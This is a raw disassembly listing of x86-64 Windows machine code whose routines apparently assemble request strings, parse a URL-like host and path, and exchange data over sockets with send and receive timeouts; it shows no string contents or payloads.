   140002569:	49 63 c0             	movslq %r8d,%rax
   14000256c:	48 83 c0 04          	add    $0x4,%rax
   140002570:	48 03 c1             	add    %rcx,%rax
   140002573:	c3                   	ret
   140002574:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002579:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   14000257e:	55                   	push   %rbp
   14000257f:	57                   	push   %rdi
   140002580:	41 54                	push   %r12
   140002582:	41 55                	push   %r13
   140002584:	41 56                	push   %r14
   140002586:	48 8d ac 24 70 f2 ff 	lea    -0xd90(%rsp),%rbp
   14000258d:	ff 
   14000258e:	48 81 ec 90 0e 00 00 	sub    $0xe90,%rsp
   140002595:	48 8b 05 44 7b 00 00 	mov    0x7b44(%rip),%rax        # 0x14000a0e0
   14000259c:	48 33 c4             	xor    %rsp,%rax
   14000259f:	48 89 85 80 0d 00 00 	mov    %rax,0xd80(%rbp)
   1400025a6:	4c 8b f2             	mov    %rdx,%r14
   1400025a9:	48 8b f9             	mov    %rcx,%rdi
   1400025ac:	33 d2                	xor    %edx,%edx
   1400025ae:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400025b3:	41 b8 10 04 00 00    	mov    $0x410,%r8d
   1400025b9:	e8 82 4b 00 00       	call   0x140007140
   1400025be:	45 33 e4             	xor    %r12d,%r12d
   1400025c1:	44 38 25 c8 bb 00 00 	cmp    %r12b,0xbbc8(%rip)        # 0x14000e190
   1400025c8:	0f 84 7b 02 00 00    	je     0x140002849
   1400025ce:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400025d3:	48 8b cf             	mov    %rdi,%rcx
   1400025d6:	e8 fd 05 00 00       	call   0x140002bd8
   1400025db:	84 c0                	test   %al,%al
   1400025dd:	0f 84 66 02 00 00    	je     0x140002849
   1400025e3:	41 bd 00 08 00 00    	mov    $0x800,%r13d
   1400025e9:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   1400025f0:	45 8b c5             	mov    %r13d,%r8d
   1400025f3:	33 d2                	xor    %edx,%edx
   1400025f5:	e8 46 4b 00 00       	call   0x140007140
   1400025fa:	33 d2                	xor    %edx,%edx
   1400025fc:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002603:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140002609:	e8 32 4b 00 00       	call   0x140007140
   14000260e:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002615:	41 8d 5c 24 01       	lea    0x1(%r12),%ebx
   14000261a:	48 2b cb             	sub    %rbx,%rcx
   14000261d:	48 03 cb             	add    %rbx,%rcx
   140002620:	44 38 21             	cmp    %r12b,(%rcx)
   140002623:	75 f8                	jne    0x14000261d
   140002625:	48 8d 3d f4 5d 00 00 	lea    0x5df4(%rip),%rdi        # 0x140008420
   14000262c:	33 d2                	xor    %edx,%edx
   14000262e:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140002631:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002634:	48 ff c2             	inc    %rdx
   140002637:	84 c0                	test   %al,%al
   140002639:	75 f3                	jne    0x14000262e
   14000263b:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002642:	48 2b cb             	sub    %rbx,%rcx
   140002645:	44 38 64 24 70       	cmp    %r12b,0x70(%rsp)
   14000264a:	74 1e                	je     0x14000266a
   14000264c:	48 03 cb             	add    %rbx,%rcx
   14000264f:	44 38 21             	cmp    %r12b,(%rcx)
   140002652:	75 f8                	jne    0x14000264c
   140002654:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140002659:	33 d2                	xor    %edx,%edx
   14000265b:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   14000265e:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002661:	48 ff c2             	inc    %rdx
   140002664:	84 c0                	test   %al,%al
   140002666:	75 f3                	jne    0x14000265b
   140002668:	eb 12                	jmp    0x14000267c
   14000266a:	48 03 cb             	add    %rbx,%rcx
   14000266d:	44 38 21             	cmp    %r12b,(%rcx)
   140002670:	75 f8                	jne    0x14000266a
   140002672:	0f b7 05 b7 4e 00 00 	movzwl 0x4eb7(%rip),%eax        # 0x140007530
   140002679:	66 89 01             	mov    %ax,(%rcx)
   14000267c:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002683:	48 2b cb             	sub    %rbx,%rcx
   140002686:	48 03 cb             	add    %rbx,%rcx
   140002689:	44 38 21             	cmp    %r12b,(%rcx)
   14000268c:	75 f8                	jne    0x140002686
   14000268e:	48 8d 3d 93 5d 00 00 	lea    0x5d93(%rip),%rdi        # 0x140008428
   140002695:	33 d2                	xor    %edx,%edx
   140002697:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   14000269a:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   14000269d:	48 ff c2             	inc    %rdx
   1400026a0:	84 c0                	test   %al,%al
   1400026a2:	75 f3                	jne    0x140002697
   1400026a4:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400026ab:	48 2b cb             	sub    %rbx,%rcx
   1400026ae:	48 03 cb             	add    %rbx,%rcx
   1400026b1:	44 38 21             	cmp    %r12b,(%rcx)
   1400026b4:	75 f8                	jne    0x1400026ae
   1400026b6:	48 8d bd 80 01 00 00 	lea    0x180(%rbp),%rdi
   1400026bd:	33 d2                	xor    %edx,%edx
   1400026bf:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   1400026c2:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   1400026c5:	48 ff c2             	inc    %rdx
   1400026c8:	84 c0                	test   %al,%al
   1400026ca:	75 f3                	jne    0x1400026bf
   1400026cc:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400026d3:	48 2b cb             	sub    %rbx,%rcx
   1400026d6:	48 03 cb             	add    %rbx,%rcx
   1400026d9:	44 38 21             	cmp    %r12b,(%rcx)
   1400026dc:	75 f8                	jne    0x1400026d6
   1400026de:	48 8d 3d 5b 5d 00 00 	lea    0x5d5b(%rip),%rdi        # 0x140008440
   1400026e5:	33 d2                	xor    %edx,%edx
   1400026e7:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   1400026ea:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   1400026ed:	48 ff c2             	inc    %rdx
   1400026f0:	84 c0                	test   %al,%al
   1400026f2:	75 f3                	jne    0x1400026e7
   1400026f4:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400026f7:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400026fc:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140002701:	bf 02 00 00 00       	mov    $0x2,%edi
   140002706:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   14000270a:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000270f:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002714:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   14000271b:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   140002722:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002727:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000272c:	e8 d7 ed ff ff       	call   0x140001508
   140002731:	44 8d 47 04          	lea    0x4(%rdi),%r8d
   140002735:	8b d3                	mov    %ebx,%edx
   140002737:	8b cf                	mov    %edi,%ecx
   140002739:	e8 ea ef ff ff       	call   0x140001728
   14000273e:	bf ff ff 00 00       	mov    $0xffff,%edi
   140002743:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000274a:	00 
   14000274b:	8b d7                	mov    %edi,%edx
   14000274d:	4c 8d 0d bc 78 00 00 	lea    0x78bc(%rip),%r9        # 0x14000a010
   140002754:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   14000275a:	8b c8                	mov    %eax,%ecx
   14000275c:	8b f0                	mov    %eax,%esi
   14000275e:	e8 91 ef ff ff       	call   0x1400016f4
   140002763:	4c 8d 0d a6 78 00 00 	lea    0x78a6(%rip),%r9        # 0x14000a010
   14000276a:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002771:	00 
   140002772:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   140002778:	8b d7                	mov    %edi,%edx
   14000277a:	8b ce                	mov    %esi,%ecx
   14000277c:	e8 73 ef ff ff       	call   0x1400016f4
   140002781:	85 f6                	test   %esi,%esi
   140002783:	0f 84 a3 00 00 00    	je     0x14000282c
   140002789:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   14000278f:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002794:	8b ce                	mov    %esi,%ecx
   140002796:	e8 45 ed ff ff       	call   0x1400014e0
   14000279b:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000279e:	0f 84 81 00 00 00    	je     0x140002825
   1400027a4:	48 8d 85 80 03 00 00 	lea    0x380(%rbp),%rax
   1400027ab:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   1400027af:	49 ff c0             	inc    %r8
   1400027b2:	46 38 24 00          	cmp    %r12b,(%rax,%r8,1)
   1400027b6:	75 f7                	jne    0x1400027af
   1400027b8:	4c 03 c3             	add    %rbx,%r8
   1400027bb:	48 8d 95 80 03 00 00 	lea    0x380(%rbp),%rdx
   1400027c2:	45 33 c9             	xor    %r9d,%r9d
   1400027c5:	8b ce                	mov    %esi,%ecx
   1400027c7:	e8 f4 ee ff ff       	call   0x1400016c0
   1400027cc:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400027cf:	74 54                	je     0x140002825
   1400027d1:	eb 3f                	jmp    0x140002812
   1400027d3:	33 c0                	xor    %eax,%eax
   1400027d5:	48 8d bd 80 05 00 00 	lea    0x580(%rbp),%rdi
   1400027dc:	49 8b cd             	mov    %r13,%rcx
   1400027df:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   1400027e6:	f3 aa                	rep stos %al,(%rdi)
   1400027e8:	8b ce                	mov    %esi,%ecx
   1400027ea:	45 33 c9             	xor    %r9d,%r9d
   1400027ed:	4d 8b c5             	mov    %r13,%r8
   1400027f0:	e8 97 ee ff ff       	call   0x14000168c
   1400027f5:	8d 48 01             	lea    0x1(%rax),%ecx
   1400027f8:	3b cb                	cmp    %ebx,%ecx
   1400027fa:	76 29                	jbe    0x140002825
   1400027fc:	44 8b c0             	mov    %eax,%r8d
   1400027ff:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   140002806:	49 8b ce             	mov    %r14,%rcx
   140002809:	e8 6a 0c 00 00       	call   0x140003478
   14000280e:	84 c0                	test   %al,%al
   140002810:	74 0b                	je     0x14000281d
   140002812:	44 38 25 b7 b9 00 00 	cmp    %r12b,0xb9b7(%rip)        # 0x14000e1d0
   140002819:	74 b8                	je     0x1400027d3
   14000281b:	eb 08                	jmp    0x140002825
   14000281d:	49 8b ce             	mov    %r14,%rcx
   140002820:	e8 e3 0c 00 00       	call   0x140003508
   140002825:	8b ce                	mov    %esi,%ecx
   140002827:	e8 7c ec ff ff       	call   0x1400014a8
   14000282c:	49 8b ce             	mov    %r14,%rcx
   14000282f:	e8 d0 0d 00 00       	call   0x140003604
   140002834:	48 85 c0             	test   %rax,%rax
   140002837:	74 09                	je     0x140002842
   140002839:	44 38 25 90 b9 00 00 	cmp    %r12b,0xb990(%rip)        # 0x14000e1d0
   140002840:	74 03                	je     0x140002845
   140002842:	41 8a dc             	mov    %r12b,%bl
   140002845:	8a c3                	mov    %bl,%al
   140002847:	eb 02                	jmp    0x14000284b
   140002849:	32 c0                	xor    %al,%al
   14000284b:	48 8b 8d 80 0d 00 00 	mov    0xd80(%rbp),%rcx
   140002852:	48 33 cc             	xor    %rsp,%rcx
   140002855:	e8 d6 47 00 00       	call   0x140007030
   14000285a:	4c 8d 9c 24 90 0e 00 	lea    0xe90(%rsp),%r11
   140002861:	00 
   140002862:	49 8b 5b 40          	mov    0x40(%r11),%rbx
   140002866:	49 8b 73 48          	mov    0x48(%r11),%rsi
   14000286a:	49 8b e3             	mov    %r11,%rsp
   14000286d:	41 5e                	pop    %r14
   14000286f:	41 5d                	pop    %r13
   140002871:	41 5c                	pop    %r12
   140002873:	5f                   	pop    %rdi
   140002874:	5d                   	pop    %rbp
   140002875:	c3                   	ret
   140002876:	cc                   	int3
   140002877:	cc                   	int3
   140002878:	40 55                	rex push %rbp
   14000287a:	53                   	push   %rbx
   14000287b:	56                   	push   %rsi
   14000287c:	57                   	push   %rdi
   14000287d:	41 55                	push   %r13
   14000287f:	41 56                	push   %r14
   140002881:	41 57                	push   %r15
   140002883:	48 8d ac 24 70 f6 ff 	lea    -0x990(%rsp),%rbp
   14000288a:	ff 
   14000288b:	48 81 ec 90 0a 00 00 	sub    $0xa90,%rsp
   140002892:	48 8b 05 47 78 00 00 	mov    0x7847(%rip),%rax        # 0x14000a0e0
   140002899:	48 33 c4             	xor    %rsp,%rax
   14000289c:	48 89 85 80 09 00 00 	mov    %rax,0x980(%rbp)
   1400028a3:	4d 8b e8             	mov    %r8,%r13
   1400028a6:	4c 8b fa             	mov    %rdx,%r15
   1400028a9:	48 8b f9             	mov    %rcx,%rdi
   1400028ac:	33 f6                	xor    %esi,%esi
   1400028ae:	33 d2                	xor    %edx,%edx
   1400028b0:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   1400028b5:	41 b8 10 04 00 00    	mov    $0x410,%r8d
   1400028bb:	44 8b f6             	mov    %esi,%r14d
   1400028be:	e8 7d 48 00 00       	call   0x140007140
   1400028c3:	40 38 35 c6 b8 00 00 	cmp    %sil,0xb8c6(%rip)        # 0x14000e190
   1400028ca:	0f 84 c6 02 00 00    	je     0x140002b96
   1400028d0:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400028d5:	48 8b cf             	mov    %rdi,%rcx
   1400028d8:	e8 fb 02 00 00       	call   0x140002bd8
   1400028dd:	84 c0                	test   %al,%al
   1400028df:	0f 84 b1 02 00 00    	je     0x140002b96
   1400028e5:	33 d2                	xor    %edx,%edx
   1400028e7:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400028ee:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   1400028f4:	e8 47 48 00 00       	call   0x140007140
   1400028f9:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002900:	8d 5e 01             	lea    0x1(%rsi),%ebx
   140002903:	48 2b cb             	sub    %rbx,%rcx
   140002906:	48 03 cb             	add    %rbx,%rcx
   140002909:	40 38 31             	cmp    %sil,(%rcx)
   14000290c:	75 f8                	jne    0x140002906
   14000290e:	48 8d 3d 0b 5b 00 00 	lea    0x5b0b(%rip),%rdi        # 0x140008420
   140002915:	33 d2                	xor    %edx,%edx
   140002917:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   14000291a:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   14000291d:	48 ff c2             	inc    %rdx
   140002920:	84 c0                	test   %al,%al
   140002922:	75 f3                	jne    0x140002917
   140002924:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000292b:	48 2b cb             	sub    %rbx,%rcx
   14000292e:	40 38 74 24 70       	cmp    %sil,0x70(%rsp)
   140002933:	74 1e                	je     0x140002953
   140002935:	48 03 cb             	add    %rbx,%rcx
   140002938:	40 38 31             	cmp    %sil,(%rcx)
   14000293b:	75 f8                	jne    0x140002935
   14000293d:	48 8d 7c 24 70       	lea    0x70(%rsp),%rdi
   140002942:	33 d2                	xor    %edx,%edx
   140002944:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140002947:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   14000294a:	48 ff c2             	inc    %rdx
   14000294d:	84 c0                	test   %al,%al
   14000294f:	75 f3                	jne    0x140002944
   140002951:	eb 12                	jmp    0x140002965
   140002953:	48 03 cb             	add    %rbx,%rcx
   140002956:	40 38 31             	cmp    %sil,(%rcx)
   140002959:	75 f8                	jne    0x140002953
   14000295b:	0f b7 05 ce 4b 00 00 	movzwl 0x4bce(%rip),%eax        # 0x140007530
   140002962:	66 89 01             	mov    %ax,(%rcx)
   140002965:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000296c:	48 2b cb             	sub    %rbx,%rcx
   14000296f:	48 03 cb             	add    %rbx,%rcx
   140002972:	40 38 31             	cmp    %sil,(%rcx)
   140002975:	75 f8                	jne    0x14000296f
   140002977:	48 8d 3d aa 5a 00 00 	lea    0x5aaa(%rip),%rdi        # 0x140008428
   14000297e:	33 d2                	xor    %edx,%edx
   140002980:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   140002983:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   140002986:	48 ff c2             	inc    %rdx
   140002989:	84 c0                	test   %al,%al
   14000298b:	75 f3                	jne    0x140002980
   14000298d:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140002994:	48 2b cb             	sub    %rbx,%rcx
   140002997:	48 03 cb             	add    %rbx,%rcx
   14000299a:	40 38 31             	cmp    %sil,(%rcx)
   14000299d:	75 f8                	jne    0x140002997
   14000299f:	48 8d bd 80 01 00 00 	lea    0x180(%rbp),%rdi
   1400029a6:	33 d2                	xor    %edx,%edx
   1400029a8:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   1400029ab:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   1400029ae:	48 ff c2             	inc    %rdx
   1400029b1:	84 c0                	test   %al,%al
   1400029b3:	75 f3                	jne    0x1400029a8
   1400029b5:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400029bc:	48 2b cb             	sub    %rbx,%rcx
   1400029bf:	48 03 cb             	add    %rbx,%rcx
   1400029c2:	40 38 31             	cmp    %sil,(%rcx)
   1400029c5:	75 f8                	jne    0x1400029bf
   1400029c7:	48 8d 3d 72 5a 00 00 	lea    0x5a72(%rip),%rdi        # 0x140008440
   1400029ce:	33 d2                	xor    %edx,%edx
   1400029d0:	8a 04 17             	mov    (%rdi,%rdx,1),%al
   1400029d3:	88 04 11             	mov    %al,(%rcx,%rdx,1)
   1400029d6:	48 ff c2             	inc    %rdx
   1400029d9:	84 c0                	test   %al,%al
   1400029db:	75 f3                	jne    0x1400029d0
   1400029dd:	33 d2                	xor    %edx,%edx
   1400029df:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   1400029e6:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   1400029ec:	e8 4f 47 00 00       	call   0x140007140
   1400029f1:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400029f4:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400029f9:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400029fe:	bf 02 00 00 00       	mov    $0x2,%edi
   140002a03:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   140002a07:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140002a0c:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140002a11:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   140002a18:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   140002a1f:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140002a24:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   140002a29:	e8 da ea ff ff       	call   0x140001508
   140002a2e:	44 8d 47 04          	lea    0x4(%rdi),%r8d
   140002a32:	8b d3                	mov    %ebx,%edx
   140002a34:	8b cf                	mov    %edi,%ecx
   140002a36:	e8 ed ec ff ff       	call   0x140001728
   140002a3b:	bf ff ff 00 00       	mov    $0xffff,%edi
   140002a40:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a47:	00 
   140002a48:	8b d7                	mov    %edi,%edx
   140002a4a:	4c 8d 0d bf 75 00 00 	lea    0x75bf(%rip),%r9        # 0x14000a010
   140002a51:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   140002a57:	8b c8                	mov    %eax,%ecx
   140002a59:	8b f0                	mov    %eax,%esi
   140002a5b:	e8 94 ec ff ff       	call   0x1400016f4
   140002a60:	4c 8d 0d a9 75 00 00 	lea    0x75a9(%rip),%r9        # 0x14000a010
   140002a67:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140002a6e:	00 
   140002a6f:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   140002a75:	8b d7                	mov    %edi,%edx
   140002a77:	8b ce                	mov    %esi,%ecx
   140002a79:	e8 76 ec ff ff       	call   0x1400016f4
   140002a7e:	85 f6                	test   %esi,%esi
   140002a80:	0f 84 0a 01 00 00    	je     0x140002b90
   140002a86:	41 b8 10 00 00 00    	mov    $0x10,%r8d
   140002a8c:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140002a91:	8b ce                	mov    %esi,%ecx
   140002a93:	e8 48 ea ff ff       	call   0x1400014e0
   140002a98:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002a9b:	0f 84 da 00 00 00    	je     0x140002b7b
   140002aa1:	48 8d 85 80 03 00 00 	lea    0x380(%rbp),%rax
   140002aa8:	49 83 c8 ff          	or     $0xffffffffffffffff,%r8
   140002aac:	49 ff c0             	inc    %r8
   140002aaf:	46 38 34 00          	cmp    %r14b,(%rax,%r8,1)
   140002ab3:	75 f7                	jne    0x140002aac
   140002ab5:	4c 03 c3             	add    %rbx,%r8
   140002ab8:	48 8d 95 80 03 00 00 	lea    0x380(%rbp),%rdx
   140002abf:	45 33 c9             	xor    %r9d,%r9d
   140002ac2:	8b ce                	mov    %esi,%ecx
   140002ac4:	e8 f7 eb ff ff       	call   0x1400016c0
   140002ac9:	83 f8 ff             	cmp    $0xffffffff,%eax
   140002acc:	0f 84 a9 00 00 00    	je     0x140002b7b
   140002ad2:	44 38 35 f7 b6 00 00 	cmp    %r14b,0xb6f7(%rip)        # 0x14000e1d0
   140002ad9:	0f 85 9c 00 00 00    	jne    0x140002b7b
   140002adf:	33 c0                	xor    %eax,%eax
   140002ae1:	48 8d bd 80 05 00 00 	lea    0x580(%rbp),%rdi
   140002ae8:	b9 00 04 00 00       	mov    $0x400,%ecx
   140002aed:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   140002af4:	f3 aa                	rep stos %al,(%rdi)
   140002af6:	8b ce                	mov    %esi,%ecx
   140002af8:	45 33 c9             	xor    %r9d,%r9d
   140002afb:	41 b8 ff 03 00 00    	mov    $0x3ff,%r8d
   140002b01:	e8 86 eb ff ff       	call   0x14000168c
   140002b06:	48 83 cf ff          	or     $0xffffffffffffffff,%rdi
   140002b0a:	3b c7                	cmp    %edi,%eax
   140002b0c:	74 6d                	je     0x140002b7b
   140002b0e:	80 bd 80 05 00 00 00 	cmpb   $0x0,0x580(%rbp)
   140002b15:	74 64                	je     0x140002b7b
   140002b17:	85 c0                	test   %eax,%eax
   140002b19:	74 60                	je     0x140002b7b
   140002b1b:	c6 85 7f 09 00 00 00 	movb   $0x0,0x97f(%rbp)
   140002b22:	48 8b c7             	mov    %rdi,%rax
   140002b25:	48 ff c0             	inc    %rax
   140002b28:	41 80 3c 07 00       	cmpb   $0x0,(%r15,%rax,1)
   140002b2d:	75 f6                	jne    0x140002b25
   140002b2f:	4d 8b c5             	mov    %r13,%r8
   140002b32:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   140002b39:	4c 2b c0             	sub    %rax,%r8
   140002b3c:	49 8b cf             	mov    %r15,%rcx
   140002b3f:	4c 2b c3             	sub    %rbx,%r8
   140002b42:	e8 83 44 00 00       	call   0x140006fca
   140002b47:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   140002b4e:	48 8b c7             	mov    %rdi,%rax
   140002b51:	48 ff c0             	inc    %rax
   140002b54:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002b58:	75 f7                	jne    0x140002b51
   140002b5a:	4c 03 f0             	add    %rax,%r14
   140002b5d:	49 8d 45 ff          	lea    -0x1(%r13),%rax
   140002b61:	4c 3b f0             	cmp    %rax,%r14
   140002b64:	73 0f                	jae    0x140002b75
   140002b66:	80 3d 63 b6 00 00 00 	cmpb   $0x0,0xb663(%rip)        # 0x14000e1d0
   140002b6d:	0f 84 6c ff ff ff    	je     0x140002adf
   140002b73:	eb 06                	jmp    0x140002b7b
   140002b75:	43 c6 44 2f ff 00    	movb   $0x0,-0x1(%r15,%r13,1)
   140002b7b:	8b ce                	mov    %esi,%ecx
   140002b7d:	e8 26 e9 ff ff       	call   0x1400014a8
   140002b82:	4d 85 f6             	test   %r14,%r14
   140002b85:	74 09                	je     0x140002b90
   140002b87:	80 3d 42 b6 00 00 00 	cmpb   $0x0,0xb642(%rip)        # 0x14000e1d0
   140002b8e:	74 02                	je     0x140002b92
   140002b90:	32 db                	xor    %bl,%bl
   140002b92:	8a c3                	mov    %bl,%al
   140002b94:	eb 02                	jmp    0x140002b98
   140002b96:	32 c0                	xor    %al,%al
   140002b98:	48 8b 8d 80 09 00 00 	mov    0x980(%rbp),%rcx
   140002b9f:	48 33 cc             	xor    %rsp,%rcx
   140002ba2:	e8 89 44 00 00       	call   0x140007030
   140002ba7:	48 81 c4 90 0a 00 00 	add    $0xa90,%rsp
   140002bae:	41 5f                	pop    %r15
   140002bb0:	41 5e                	pop    %r14
   140002bb2:	41 5d                	pop    %r13
   140002bb4:	5f                   	pop    %rdi
   140002bb5:	5e                   	pop    %rsi
   140002bb6:	5b                   	pop    %rbx
   140002bb7:	5d                   	pop    %rbp
   140002bb8:	c3                   	ret
   140002bb9:	cc                   	int3
   140002bba:	cc                   	int3
   140002bbb:	cc                   	int3
   140002bbc:	48 83 ec 28          	sub    $0x28,%rsp
   140002bc0:	e8 33 06 00 00       	call   0x1400031f8
   140002bc5:	85 c0                	test   %eax,%eax
   140002bc7:	0f 99 c0             	setns  %al
   140002bca:	88 05 c0 b5 00 00    	mov    %al,0xb5c0(%rip)        # 0x14000e190
   140002bd0:	48 83 c4 28          	add    $0x28,%rsp
   140002bd4:	c3                   	ret
   140002bd5:	cc                   	int3
   140002bd6:	cc                   	int3
   140002bd7:	cc                   	int3
   140002bd8:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140002bdd:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   140002be2:	56                   	push   %rsi
   140002be3:	57                   	push   %rdi
   140002be4:	41 56                	push   %r14
   140002be6:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   140002bed:	48 8b 05 ec 74 00 00 	mov    0x74ec(%rip),%rax        # 0x14000a0e0
   140002bf4:	48 33 c4             	xor    %rsp,%rax
   140002bf7:	48 89 84 24 40 04 00 	mov    %rax,0x440(%rsp)
   140002bfe:	00 
   140002bff:	48 8b fa             	mov    %rdx,%rdi
   140002c02:	48 8b d9             	mov    %rcx,%rbx
   140002c05:	33 d2                	xor    %edx,%edx
   140002c07:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002c0c:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140002c12:	e8 29 45 00 00       	call   0x140007140
   140002c17:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140002c1c:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002c21:	44 8b ca             	mov    %edx,%r9d
   140002c24:	4c 8b c3             	mov    %rbx,%r8
   140002c27:	e8 a4 43 00 00       	call   0x140006fd0
   140002c2c:	33 c0                	xor    %eax,%eax
   140002c2e:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002c33:	0f 57 c0             	xorps  %xmm0,%xmm0
   140002c36:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140002c3a:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140002c3e:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   140002c43:	48 ff c0             	inc    %rax
   140002c46:	80 3c 01 00          	cmpb   $0x0,(%rcx,%rax,1)
   140002c4a:	75 f7                	jne    0x140002c43
   140002c4c:	4c 8d 74 24 40       	lea    0x40(%rsp),%r14
   140002c51:	48 8d 15 b8 48 00 00 	lea    0x48b8(%rip),%rdx        # 0x140007510
   140002c58:	4c 03 f0             	add    %rax,%r14
   140002c5b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002c60:	e8 71 43 00 00       	call   0x140006fd6
   140002c65:	48 85 c0             	test   %rax,%rax
   140002c68:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140002c6d:	ba 3a 00 00 00       	mov    $0x3a,%edx
   140002c72:	48 8d 48 02          	lea    0x2(%rax),%rcx
   140002c76:	48 0f 45 e9          	cmovne %rcx,%rbp
   140002c7a:	48 8b cd             	mov    %rbp,%rcx
   140002c7d:	e8 42 43 00 00       	call   0x140006fc4
   140002c82:	ba 2f 00 00 00       	mov    $0x2f,%edx
   140002c87:	48 8b cd             	mov    %rbp,%rcx
   140002c8a:	48 8b f0             	mov    %rax,%rsi
   140002c8d:	e8 32 43 00 00       	call   0x140006fc4
   140002c92:	48 8b d8             	mov    %rax,%rbx
   140002c95:	48 85 c0             	test   %rax,%rax
   140002c98:	75 05                	jne    0x140002c9f
   140002c9a:	49 8b de             	mov    %r14,%rbx
   140002c9d:	eb 13                	jmp    0x140002cb2
   140002c9f:	ba ff 01 00 00       	mov    $0x1ff,%edx
   140002ca4:	4c 8b c0             	mov    %rax,%r8
   140002ca7:	44 8b ca             	mov    %edx,%r9d
   140002caa:	48 8b cf             	mov    %rdi,%rcx
   140002cad:	e8 1e 43 00 00       	call   0x140006fd0
